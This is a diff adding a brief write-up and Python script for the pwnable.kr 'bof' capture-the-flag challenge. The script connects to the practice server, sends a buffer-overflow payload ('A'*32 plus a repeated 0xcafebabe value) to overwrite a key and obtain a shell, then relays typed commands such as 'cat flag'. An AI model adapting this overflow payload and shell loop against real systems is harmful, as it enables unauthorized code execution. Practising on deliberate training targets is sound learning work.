@@ -1,0 +1,26 @@
+//Buffer Overflow
+//I created a socket connection and then passed it 'A'*32 to fill overflowme
+//Then I passed 0xcafebabe (backwards) * 8 because 4 wasn't big enough to rewrite key...
+//Then I could type 'cat flag' and receive the flag!
+
+python bof.py
+cat flag
+
+I wrote a python script for this one.
+After I completed it, I tried to make it able to send multiple commands... It stalls after the second send.
+
+###
+import socket
+
+s = socket.socket()
+s.connect(('pwnable.kr', 9000))
+
+s.send('A'*32+'\xbe\xba\xfe\xca'*8+'\n')
+data = 'a'
+while(data != ''):
+    inn = raw_input('Command: ')
+    s.send(inn+'\n')
+    data = s.recv(8192)
+
+    print(data)
+###
